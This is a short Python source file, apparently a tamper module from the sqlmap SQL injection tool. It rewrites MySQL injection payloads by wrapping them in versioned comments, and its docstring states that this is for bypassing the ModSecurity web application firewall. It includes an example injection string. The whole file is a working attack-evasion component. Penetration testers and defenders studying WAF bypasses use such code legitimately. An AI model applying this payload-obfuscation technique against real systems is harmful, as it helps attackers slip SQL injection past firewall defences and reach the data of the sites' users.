#!/usr/bin/env python

"""
$Id$

Copyright (c) 2006-2011 sqlmap developers (http://www.sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHER

def dependencies():
    pass

def tamper(payload):
    """
    Replaces ...

    Example:
        * Input: 1 AND 2>1--
        * Output: 1 /*!30000AND 2>1*/--

    Requirement:
        * MySQL

    Tested against:
        * MySQL 5.0

    Notes:
        * Useful to bypass ModSecurity WAF/IDS
    """

    retVal = payload

    if payload:
        postfix = ''
        for comment in ('#', '--', '/*'):
            if comment in payload:
                postfix = payload[payload.find(comment):]
                payload = payload[:payload.find(comment)]
                break
        if ' ' in payload:
            retVal = "%s /*!30000%s*/%s" % (payload[:payload.find(' ')], payload[payload.find(' ') + 1:], postfix)

    return retVal
